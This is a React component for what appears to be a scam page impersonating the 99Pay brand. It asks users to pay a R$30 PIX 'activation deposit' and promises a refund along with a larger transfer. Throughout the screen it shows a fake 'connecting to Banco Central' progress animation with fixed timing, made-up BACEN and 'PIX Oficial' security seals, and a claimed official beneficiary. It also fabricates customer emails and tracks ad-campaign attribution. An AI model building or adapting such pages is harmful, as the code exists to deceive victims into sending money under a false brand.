"use client"

import { useState, useEffect, useRef } from "react"
import { getUtmsForApi, captureAndPersistUtms, buildUtmQueryString } from "@/lib/utm"

interface DepositScreenProps {
  userName: string
  userCpf: string
  transferAmount: string
  onBack: () => void
  onPaid?: () => void
}

const DEPOSIT_AMOUNT_CENTS = 3000 // R$ 30,00
// Tempo MAXIMO de exibicao da tela de "preparando" antes de ir pro pagamento (hard cap)
const MAX_PREPARING_MS = 8000

function buildFakeEmail(name: string) {
  const clean = (name || "usuario")
    .toLowerCase()
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/[^a-z0-9]/g, ".")
    .replace(/\.+/g, ".")
    .replace(/^\.|\.$/g, "")
  return `${clean || "usuario"}@99pay.app.br`
}

export function DepositScreen({
  userName,
  userCpf,
  transferAmount,
  onBack,
  onPaid,
}: DepositScreenProps) {
  const [copied, setCopied] = useState(false)
  const [timeLeft, setTimeLeft] = useState(15 * 60)
  const [preparing, setPreparing] = useState(true)
  const [preparingStep, setPreparingStep] = useState(0)
  const [pixError, setPixError] = useState<string | null>(null)
  const [pixCode, setPixCode] = useState<string>("")
  const [transactionId, setTransactionId] = useState<string>("")
  const [status, setStatus] = useState<"PENDING" | "COMPLETED" | "REFUSED" | "UNKNOWN">("PENDING")
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const createdRef = useRef(false) // guard anti-duplicacao (Strict Mode + re-render)

  const transferValue = parseInt(transferAmount || "0", 10) / 100
  const totalValue = transferValue + 30
  const formatBR = (n: number) =>
    n.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })

  // Cria o PIX real via backend - apenas UMA VEZ (guard via createdRef)
  useEffect(() => {
    if (createdRef.current) return
    createdRef.current = true

    let finishedPreparing = false

    // HARD CAP: sempre libera a tela apos 8s, nao importa se a API ja respondeu ou nao.
    // Isso garante que a tela de preparando NUNCA passe de 8 segundos.
    const hardCap = setTimeout(() => {
      if (finishedPreparing) return
      finishedPreparing = true
      setPreparing(false)
    }, MAX_PREPARING_MS)

    async function createPix() {
      try {
        const email = buildFakeEmail(userName)
        const phone = "11999999999"

        // Garante UTMs frescas no momento da criacao do PIX:
        // 1. captureAndPersistUtms() merge UTMs+clickIDs da URL atual (caso o
        //    usuario tenha entrado com UTMs novas) com as ja salvas, sem perder
        // 2. tracking (objeto) -> formato Utmify
        // 3. utm (string raw) -> formato Duttyfy. Se vier vazio, o Duttyfy
        //    preenche com geolocalizacao do IP do servidor como fallback
        //    (utm_city=Ashburn etc.), o que quebra a atribuicao de campanha.
        captureAndPersistUtms()
        const tracking = getUtmsForApi()
        const utm = buildUtmQueryString()

        const res = await fetch("/api/pix/create", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            amount: DEPOSIT_AMOUNT_CENTS,
            customer: {
              name: userName || "Usuário 99Pay",
              document: (userCpf || "").replace(/\D/g, "") || "00000000000",
              email,
              phone,
            },
            item: {
              title: "Ativação da conta 99Pay",
              quantity: 1,
              price: DEPOSIT_AMOUNT_CENTS,
            },
            description: "Depósito de ativação 99Pay",
            tracking,
            utm,
          }),
        })

        const data = await res.json()
        if (!res.ok) throw new Error(data?.error || "Falha ao gerar PIX")

        setPixCode(data.pixCode)
        setTransactionId(data.transactionId)
        // Nao libera aqui - o hardCap de 8s controla pra manter a animacao fluida
      } catch (err: any) {
        if (finishedPreparing) return
        finishedPreparing = true
        clearTimeout(hardCap)
        setPixError(err?.message || "Não foi possível gerar o PIX")
        setPreparing(false)
      }
    }

    createPix()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // Animacao dos steps na tela de preparando
  // 4 steps em 8s -> avanca 1 step a cada ~1800ms (completa no 5400ms, deixa 2.6s no step final)
  useEffect(() => {
    if (!preparing) return
    const steps = [0, 1, 2, 3]
    let i = 0
    const interval = setInterval(() => {
      i = Math.min(i + 1, steps.length - 1)
      setPreparingStep(i)
      if (i >= steps.length - 1) clearInterval(interval)
    }, 1800)
    return () => clearInterval(interval)
  }, [preparing])

  // Polling de status a cada 4s
  useEffect(() => {
    if (!transactionId) return
    if (status === "COMPLETED") return

    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/pix/status/${transactionId}`, { cache: "no-store" })
        if (!res.ok) return
        const data = await res.json()
        if (data?.status && data.status !== status) {
          setStatus(data.status)
          if (data.status === "COMPLETED") {
            if (pollingRef.current) clearInterval(pollingRef.current)
            setTimeout(() => onPaid?.(), 1200)
          }
        }
      } catch {
        // silencioso
      }
    }, 4000)

    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current)
    }
  }, [transactionId, status, onPaid])

  // Countdown
  useEffect(() => {
    if (preparing) return
    if (timeLeft <= 0) return
    const timer = setInterval(() => {
      setTimeLeft((t) => t - 1)
    }, 1000)
    return () => clearInterval(timer)
  }, [timeLeft, preparing])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`
  }

  const handleCopy = async () => {
    if (!pixCode) return
    try {
      await navigator.clipboard.writeText(pixCode)
      setCopied(true)
    } catch {
      setCopied(true)
    }
  }

  // ==============================
  // TELA DE ANIMACAO "Preparando"
  // ==============================
  if (preparing) {
    const steps = [
      { label: "Conectando ao Banco Central", description: "Estabelecendo canal seguro" },
      { label: "Validando seus dados", description: "Verificando informações da conta" },
      { label: "Gerando código PIX", description: "Criando transação criptografada" },
      { label: "Finalizando", description: "Preparando ambiente de pagamento" },
    ]

    return (
      <div className="fixed inset-0 bg-white z-[150] flex flex-col animate-in fade-in duration-400 overflow-hidden">
        {/* Faixa decorativa superior */}
        <div className="absolute top-0 inset-x-0 h-[220px] bg-gradient-to-b from-[#FFF9D6] via-[#FFFCEC] to-white pointer-events-none" />
        <div className="absolute top-0 left-0 w-64 h-64 bg-[#FFE500]/15 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute top-10 right-0 w-48 h-48 bg-[#FFB800]/10 rounded-full blur-3xl pointer-events-none" />

        {/* Header do app */}
        <div className="relative z-10 pt-5 px-4 pb-2 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-[#FFE500] rounded-lg flex items-center justify-center shadow-sm">
              <span className="text-gray-900 font-black text-sm">99</span>
            </div>
            <div>
              <p className="text-[10px] text-gray-500 font-medium leading-none">99Pay</p>
              <p className="text-xs font-bold text-gray-900 leading-tight">Pagar com PIX</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 bg-green-50 border border-green-200 rounded-full px-2.5 py-1">
            <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
            <span className="text-[10px] font-bold text-green-700 tracking-wide">PROCESSANDO</span>
          </div>
        </div>

        {/* Conteudo principal */}
        <div className="relative z-10 flex-1 overflow-y-auto px-4 py-4">
          {/* Loader circular com logo PIX e spinners */}
          <div className="flex flex-col items-center mb-6">
            <div className="relative w-44 h-44 flex items-center justify-center">
              {/* Aneis pulsantes externos */}
              <div
                className="absolute w-44 h-44 rounded-full border border-[#FFE500]/60"
                style={{ animation: "pulse-ring 2.5s ease-out infinite" }}
              />
              <div
                className="absolute w-36 h-36 rounded-full border-2 border-[#FFE500]/50"
                style={{ animation: "pulse-ring 2.5s ease-out infinite", animationDelay: "0.8s" }}
              />

              {/* Centro - circulo branco com spinners duplos */}
              <div className="relative w-28 h-28 bg-white rounded-full shadow-[0_10px_40px_-8px_rgba(255,213,0,0.5)] flex items-center justify-center border border-gray-100">
                {/* Spinner principal (horario) */}
                <svg
                  className="absolute inset-0 w-full h-full -rotate-90"
                  viewBox="0 0 112 112"
                  style={{ animation: "conic-rotate 1.2s linear infinite" }}
                >
                  <circle
                    cx="56" cy="56" r="52"
                    fill="none" stroke="#FFE500" strokeWidth="3"
                    strokeLinecap="round" strokeDasharray="70 260"
                  />
                </svg>
                {/* Segundo spinner (anti-horario, mais lento) */}
                <svg
                  className="absolute inset-0 w-full h-full rotate-90"
                  viewBox="0 0 112 112"
                  style={{ animation: "conic-rotate-reverse 1.8s linear infinite" }}
                >
                  <circle
                    cx="56" cy="56" r="48"
                    fill="none" stroke="#FFB800" strokeWidth="2"
                    strokeLinecap="round" strokeDasharray="40 260" opacity="0.6"
                  />
                </svg>

                {/* Logo PIX flutuando */}
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img
                  src="/images/pix-3d-logo.png"
                  alt="PIX"
                  className="w-16 h-16 object-contain relative z-10"
                  style={{ animation: "document-float 3s ease-in-out infinite" }}
                />
              </div>
            </div>

            <h2 className="text-xl font-bold text-gray-900 tracking-tight mt-5 mb-1 text-center">
              Preparando seu código PIX
            </h2>
            <p className="text-xs text-gray-500 text-center max-w-[280px] leading-relaxed">
              Aguarde, estamos gerando o código para o depósito de ativação da sua conta 99Pay
            </p>
          </div>

          {/* Card do valor */}
          <div
            className="bg-white rounded-2xl border border-gray-200 shadow-[0_4px_20px_-4px_rgba(0,0,0,0.06)] overflow-hidden mb-4"
            style={{ animation: "slide-in-step 0.5s ease-out forwards", opacity: 0, animationDelay: "0.15s" }}
          >
            <div className="bg-gradient-to-br from-gray-50 to-white px-4 py-3 border-b border-gray-100 flex items-center justify-between">
              <div>
                <p className="text-[10px] font-semibold text-gray-500 uppercase tracking-wider mb-0.5">
                  Valor do depósito
                </p>
                <p className="text-2xl font-bold text-gray-900 tracking-tight">R$ 30,00</p>
              </div>
              <div className="flex items-center gap-1.5 bg-[#FFE500]/20 border border-[#FFE500]/40 px-2 py-1 rounded-full">
                <div className="w-1.5 h-1.5 bg-[#FFB800] rounded-full animate-pulse" />
                <span className="text-[10px] font-bold text-gray-800 tracking-wide">GERANDO</span>
              </div>
            </div>
            <div className="px-4 py-3 text-[11px] text-gray-500 leading-relaxed">
              Valor único de ativação. Após o pagamento, o depósito é{" "}
              <span className="font-semibold text-gray-700">reembolsado junto</span> com sua transferência.
            </div>
          </div>

          {/* Stepper com progresso real */}
          <div
            className="bg-white rounded-2xl border border-gray-200 shadow-[0_4px_20px_-4px_rgba(0,0,0,0.06)] p-4 mb-4"
            style={{ animation: "slide-in-step 0.5s ease-out forwards", opacity: 0, animationDelay: "0.3s" }}
          >
            <div className="flex items-center justify-between mb-3">
              <p className="text-xs font-bold text-gray-900 uppercase tracking-wide">Status</p>
              <span className="text-xs font-bold text-[#FFB800]">
                {Math.round(((preparingStep + 1) / steps.length) * 100)}%
              </span>
            </div>

            <div className="space-y-0">
              {steps.map((step, idx) => {
                const isDone = idx < preparingStep
                const isActive = idx === preparingStep
                const isLast = idx === steps.length - 1
                return (
                  <div key={idx} className="flex items-start gap-3 pb-3 last:pb-0">
                    <div className="flex flex-col items-center flex-shrink-0">
                      {isDone ? (
                        <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center shadow-sm shadow-green-300">
                          <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3.5}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                          </svg>
                        </div>
                      ) : isActive ? (
                        <div className="relative w-7 h-7 bg-[#FFE500] rounded-full flex items-center justify-center shadow-md shadow-yellow-300">
                          <svg className="w-3.5 h-3.5 text-gray-900 animate-spin" viewBox="0 0 24 24" fill="none" style={{ animationDuration: "1s" }}>
                            <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="3" strokeDasharray="28 60" strokeLinecap="round" />
                          </svg>
                        </div>
                      ) : (
                        <div className="w-7 h-7 bg-gray-100 border-2 border-gray-200 rounded-full flex items-center justify-center">
                          <div className="w-1.5 h-1.5 bg-gray-300 rounded-full" />
                        </div>
                      )}
                      {!isLast && (
                        <div
                          className={`w-0.5 flex-1 mt-0.5 ${
                            isDone ? "bg-green-500" : "bg-gray-200"
                          }`}
                          style={{ minHeight: "16px" }}
                        />
                      )}
                    </div>
                    <div className="flex-1 pt-0.5 pb-3">
                      <p
                        className={`text-sm font-bold leading-tight ${
                          isDone || isActive ? "text-gray-900" : "text-gray-500"
                        }`}
                      >
                        {step.label}
                      </p>
                      <p className="text-[11px] text-gray-500 mt-0.5">{step.description}</p>
                    </div>
                    <span
                      className={`text-[10px] font-bold pt-1 ${
                        isDone ? "text-green-600" : isActive ? "text-[#FFB800]" : "text-gray-400"
                      }`}
                    >
                      {isDone ? "100%" : isActive ? "..." : "Aguardando"}
                    </span>
                  </div>
                )
              })}
            </div>
          </div>

          {/* Selos de seguranca */}
          <div
            className="grid grid-cols-3 gap-2"
            style={{ animation: "slide-in-step 0.5s ease-out forwards", opacity: 0, animationDelay: "0.45s" }}
          >
            <div className="bg-white rounded-xl border border-gray-200 p-2.5 flex flex-col items-center justify-center text-center">
              <svg className="w-5 h-5 text-green-600 mb-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 15l-4-4 1.41-1.41L11 13.17l6.59-6.59L19 8l-8 8z" />
              </svg>
              <p className="text-[9px] font-bold text-gray-700 leading-tight">Certificado</p>
              <p className="text-[8px] text-gray-500 leading-tight">BACEN</p>
            </div>
            <div className="bg-white rounded-xl border border-gray-200 p-2.5 flex flex-col items-center justify-center text-center">
              <svg className="w-5 h-5 text-gray-700 mb-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <p className="text-[9px] font-bold text-gray-700 leading-tight">Criptografia</p>
              <p className="text-[8px] text-gray-500 leading-tight">256-bit SSL</p>
            </div>
            <div className="bg-white rounded-xl border border-gray-200 p-2.5 flex flex-col items-center justify-center text-center">
              <svg className="w-5 h-5 text-[#FFB800] mb-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
              </svg>
              <p className="text-[9px] font-bold text-gray-700 leading-tight">PIX Oficial</p>
              <p className="text-[8px] text-gray-500 leading-tight">Banco Central</p>
            </div>
          </div>
        </div>

        {/* Footer fixo com barra de progresso */}
        <div className="relative z-10 border-t border-gray-100 bg-white px-4 pt-3 pb-4">
          <div className="h-1 bg-gray-100 rounded-full overflow-hidden relative mb-2">
            <div
              className="absolute inset-y-0 left-0 bg-gradient-to-r from-[#FFE500] to-[#FFB800] rounded-full transition-all duration-700"
              style={{ width: `${((preparingStep + 1) / 4) * 100}%` }}
            />
          </div>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-1.5">
              <svg className="w-3 h-3 text-green-600" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
              </svg>
              <span className="text-[10px] text-gray-600 font-medium">Ambiente 100% seguro</span>
            </div>
            <span className="text-[10px] text-gray-500 font-mono tracking-wide">
              Aguarde...
            </span>
          </div>
        </div>
      </div>
    )
  }

  // ==============================
  // TELA PRINCIPAL - Copia e Cola (sem QR Code)
  // ==============================
  return (
    <div className="fixed inset-0 bg-[#f5f5f5] z-[150] flex flex-col animate-in fade-in duration-300 overflow-y-auto">
      {/* Header */}
      <div className="bg-white px-4 pt-4 pb-3 flex items-center justify-between border-b border-gray-100 sticky top-0 z-10">
        <button
          onClick={onBack}
          className="w-10 h-10 flex items-center justify-center rounded-full active:bg-gray-100 transition-colors"
        >
          <svg
            className="w-5 h-5 text-gray-800"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth={2.5}
          >
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <h1 className="font-bold text-base text-gray-900">Pagar com PIX</h1>
        <div className="w-10 h-10 flex items-center justify-center">
          <div className="flex items-center gap-1 bg-green-50 px-2 py-1 rounded-full border border-green-100">
            <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
            <span className="text-[9px] font-bold text-green-700">PIX</span>
          </div>
        </div>
      </div>

      <div className="flex-1 px-4 py-4 pb-6 space-y-3">
        {/* Card valor + timer */}
        <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-100">
          <div className="flex items-center justify-between mb-3">
            <span className="text-[11px] font-semibold text-gray-500 uppercase tracking-wide">
              Valor a depositar:
            </span>
            <div className="flex items-center gap-1.5 bg-orange-50 px-2 py-0.5 rounded-full border border-orange-100">
              <svg
                className="w-3 h-3 text-orange-600"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                strokeWidth={2.5}
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <span className="text-[10px] font-bold text-orange-700 font-mono">
                {formatTime(timeLeft)}
              </span>
            </div>
          </div>

          <div className="flex items-baseline gap-1 mb-1">
            <span className="text-2xl font-bold text-gray-900">R$</span>
            <span className="text-5xl font-bold text-gray-900 leading-none tracking-tight">30</span>
            <span className="text-2xl font-bold text-gray-900">,00</span>
          </div>
          <p className="text-xs text-gray-500">Depósito único de ativação</p>
        </div>

        {/* Status do pagamento */}
        {status === "COMPLETED" && (
          <div className="bg-green-50 border border-green-200 rounded-2xl p-4 flex items-center gap-3 animate-in fade-in slide-in-from-top-2 duration-300">
            <div className="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <div>
              <p className="font-bold text-green-900 text-sm">Pagamento confirmado!</p>
              <p className="text-green-700 text-xs">Liberando sua conta...</p>
            </div>
          </div>
        )}

        {/* Erro ao gerar PIX */}
        {pixError && (
          <div className="bg-red-50 border border-red-200 rounded-2xl p-4 flex items-start gap-3">
            <div className="w-9 h-9 bg-red-500 rounded-full flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
            <div className="flex-1">
              <p className="font-bold text-red-900 text-sm">Erro ao gerar PIX</p>
              <p className="text-red-700 text-xs mt-0.5">{pixError}</p>
              <button
                onClick={() => window.location.reload()}
                className="mt-2 text-xs font-bold text-red-700 underline"
              >
                Tentar novamente
              </button>
            </div>
          </div>
        )}

        {/* PIX Copia e Cola (sem QR Code) */}
        {!pixError && pixCode && (
          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-100">
            <div className="flex items-center justify-between mb-3">
              <h3 className="font-bold text-gray-900 text-sm">PIX Copia e Cola</h3>
              <span className="text-[10px] font-semibold text-gray-400">1 toque</span>
            </div>

            <div className="bg-gray-50 rounded-xl p-3 mb-3 border border-gray-200 max-h-20 overflow-hidden relative">
              <p className="text-[10px] font-mono text-gray-600 break-all leading-relaxed line-clamp-3">
                {pixCode}
              </p>
              <div className="absolute bottom-0 left-0 right-0 h-6 bg-gradient-to-t from-gray-50 to-transparent" />
            </div>

            <button
              onClick={handleCopy}
              className={`w-full py-4 rounded-xl font-bold text-base active:scale-[0.98] transition-all flex items-center justify-center gap-2 ${
                copied
                  ? "bg-green-500 text-white shadow-lg shadow-green-200"
                  : "bg-gradient-to-r from-[#FFE500] to-[#FFC700] text-gray-900 shadow-lg shadow-yellow-200 animate-pulse-cta animate-button-shine"
              }`}
            >
              {copied ? (
                <>
                  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                  </svg>
                  Código copiado!
                </>
              ) : (
                <>
                  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
                    />
                  </svg>
                  Copiar código PIX
                </>
              )}
            </button>

            {!copied && (
              <p className="text-center text-[11px] text-gray-500 mt-3 leading-relaxed">
                Abra o app do seu banco e cole o código<br />
                na área PIX Copia e Cola
              </p>
            )}

            {/* Mensagem de sucesso + instruções após copiar */}
            {copied && (
              <div className="mt-4 animate-in fade-in slide-in-from-top-2 duration-300 space-y-3">
                <div className="flex items-center gap-2 bg-green-50 border border-green-200 rounded-xl px-3 py-2.5 shadow-sm">
                  <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
                    <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-green-900 text-sm leading-tight">
                      Código PIX copiado com sucesso!
                    </p>
                    <p className="text-green-700 text-[11px] leading-tight mt-0.5">
                      Agora é só colar no app do seu banco
                    </p>
                  </div>
                </div>

                <div className="bg-gradient-to-br from-yellow-50 to-amber-50 border border-yellow-200 rounded-xl p-4">
                  <div className="flex items-center gap-2 mb-3">
                    <div className="w-6 h-6 bg-[#FFE500] rounded-full flex items-center justify-center flex-shrink-0 shadow-sm">
                      <svg className="w-3.5 h-3.5 text-gray-900" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" />
                      </svg>
                    </div>
                    <p className="font-bold text-gray-900 text-xs uppercase tracking-wide">
                      Como finalizar o depósito
                    </p>
                  </div>

                  <ol className="space-y-2.5">
                    <li className="flex items-start gap-2.5">
                      <span className="w-5 h-5 bg-white border border-yellow-300 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-[10px] font-bold text-gray-900">1</span>
                      </span>
                      <p className="text-xs text-gray-800 leading-relaxed">
                        Abra o <span className="font-bold">app do seu banco</span> e entre na área{" "}
                        <span className="font-bold">PIX</span>
                      </p>
                    </li>
                    <li className="flex items-start gap-2.5">
                      <span className="w-5 h-5 bg-white border border-yellow-300 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-[10px] font-bold text-gray-900">2</span>
                      </span>
                      <p className="text-xs text-gray-800 leading-relaxed">
                        Selecione <span className="font-bold">&quot;PIX Copia e Cola&quot;</span>
                      </p>
                    </li>
                    <li className="flex items-start gap-2.5">
                      <span className="w-5 h-5 bg-white border border-yellow-300 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-[10px] font-bold text-gray-900">3</span>
                      </span>
                      <p className="text-xs text-gray-800 leading-relaxed">
                        <span className="font-bold">Cole o código</span> copiado
                      </p>
                    </li>
                    <li className="flex items-start gap-2.5">
                      <span className="w-5 h-5 bg-white border border-yellow-300 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-[10px] font-bold text-gray-900">4</span>
                      </span>
                      <p className="text-xs text-gray-800 leading-relaxed">
                        Confira <span className="font-bold text-gray-900">R$ 30,00</span> e{" "}
                        <span className="font-bold">confirme o pagamento</span>
                      </p>
                    </li>
                    <li className="flex items-start gap-2.5">
                      <span className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      </span>
                      <p className="text-xs text-gray-800 leading-relaxed">
                        Pronto! Sua conta será{" "}
                        <span className="font-bold text-green-700">ativada automaticamente</span>
                      </p>
                    </li>
                  </ol>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Após o pagamento você recebe */}
        <div className="bg-gradient-to-br from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-4">
          <div className="flex items-center gap-2 mb-3">
            <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 shadow-sm">
              <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h3 className="font-bold text-green-900 text-sm">Após o pagamento você recebe:</h3>
          </div>
          <div className="bg-white rounded-xl p-3 space-y-1.5">
            <div className="flex justify-between items-center">
              <span className="text-gray-600 text-xs">Sua transferência</span>
              <span className="font-bold text-gray-900 text-sm">R$ {formatBR(transferValue)}</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-600 text-xs">Reembolso do depósito</span>
              <span className="font-bold text-gray-900 text-sm">R$ 30,00</span>
            </div>
            <div className="border-t border-gray-200 my-1.5" />
            <div className="flex justify-between items-center">
              <span className="font-bold text-green-900 text-xs">Total a receber</span>
              <span className="font-black text-green-600 text-base">R$ {formatBR(totalValue)}</span>
            </div>
          </div>
        </div>

        {/* Rodape - info bancaria */}
        <div className="bg-white rounded-2xl p-4 shadow-sm border border-gray-100">
          <div className="flex items-start gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-[#FFE500] to-[#FFC700] rounded-xl flex items-center justify-center flex-shrink-0 shadow-sm">
              <svg className="w-5 h-5 text-gray-900" fill="currentColor" viewBox="0 0 24 24">
                <path d="M6.5 10h-2v7h2v-7zm6 0h-2v7h2v-7zm8.5 9H2v2h19v-2zm-2.5-9h-2v7h2v-7zm-7-6.74L16.71 6H6.29l5.21-2.74m0-2.26L2 6v2h19V6l-9.5-5z" />
              </svg>
            </div>
            <div className="flex-1">
              <h4 className="font-bold text-gray-900 text-sm mb-1">Informações do recebedor</h4>
              <div className="space-y-1">
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 text-xs">Beneficiário</span>
                  <span className="font-bold text-gray-900 text-xs">99 TECNOLOGIA LTDA</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 text-xs">CPF/CNPJ</span>
                  <span className="font-bold text-gray-900 text-xs">18.033.552/0001-61</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 text-xs">Instituição</span>
                  <span className="font-bold text-gray-900 text-xs">99Pay</span>
                </div>
                <div className="flex justify-between items-center pt-1 border-t border-gray-100 mt-1">
                  <span className="text-gray-500 text-xs">Seu CPF</span>
                  <span className="font-bold text-gray-900 text-xs font-mono">{maskCpf(userCpf)}</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Selos de segurança */}
        <div className="flex items-center justify-center gap-4 py-2">
          <div className="flex items-center gap-1.5">
            <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 15l-4-4 1.41-1.41L11 13.17l6.59-6.59L19 8l-8 8z" />
            </svg>
            <span className="text-[10px] font-semibold text-gray-600">Pagamento 100% seguro</span>
          </div>
          <div className="w-1 h-1 bg-gray-300 rounded-full" />
          <div className="flex items-center gap-1.5">
            <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-6h2v6zm0-8h-2V7h2v4z" />
            </svg>
            <span className="text-[10px] font-semibold text-gray-600">Protegido pelo BACEN</span>
          </div>
        </div>
      </div>
    </div>
  )
}

function maskCpf(cpf: string) {
  if (!cpf) return "***.***.***-**"
  const clean = cpf.replace(/\D/g, "")
  if (clean.length !== 11) return "***.***.***-**"
  return `***.${clean.slice(3, 6)}.${clean.slice(6, 9)}-**`
}
